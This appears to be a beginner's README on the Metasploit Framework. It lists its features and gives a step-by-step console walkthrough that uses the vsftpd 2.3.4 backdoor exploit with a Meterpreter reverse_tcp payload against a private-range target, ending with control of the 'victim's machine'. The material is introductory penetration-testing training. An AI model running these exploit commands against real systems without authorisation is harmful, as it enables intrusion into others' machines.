# 💣 Metasploit Framework

## Description

Metasploit is an open-source penetration testing framework widely used for developing, testing, and executing exploits against 
target systems. It provides security professionals and ethical hackers with powerful tools for vulnerability research, exploit development,
and penetration testing.

---

## ✅ Key Features:

- Huge collection of ready-to-use exploits, payloads, and auxiliary modules

- Post-exploitation tools for maintaining access and gathering data

- Built-in Meterpreter payload for advanced exploitation

- Support for vulnerability scanning and exploitation

- Integrates with tools like Nmap, Nessus, and Burp Suite

- Useful for red teaming, security assessments, and training

---




---

## Metasploit Use

- After scanning the ports of the Target machine you have seen all the active and open ports of the target machine.

- To get start with metasploit type command `msfconsole`.

- From the open ports version check which version is running on the target machine.

- Now check that version exploit is there on your Metasploit Framework by typing the command `search exploit: exploit name`.

- If that exploit is present in your metasploit framework than it will be easy for you to exploit your target machine, and
if it is not present in the metaploit framework than youhave to download it from the web browser or you can create your own exploit.


## 🛠 Example Usage

#### Start Metasploit console
**`msfconsole`**

#### Search for an exploit
**`search vsftpd`**

#### Use a module
**`use exploit/unix/ftp/vsftpd_234_backdoor`**

#### Show module options
**`show options`**

#### Set target and payload
**`set RHOSTS 192.168.1.10`**
**`set PAYLOAD linux/x86/meterpreter/reverse_tcp`**

#### Run the exploit
**`exploit`**

- After typing the Exploit it will either make a succesfull connection of connection will be failed.

- If connection is establised than simplly type command `ip a` and it will show to IP Address of the Target Machine.

- Congratualtions Now you can use the victim's machine.

  ---
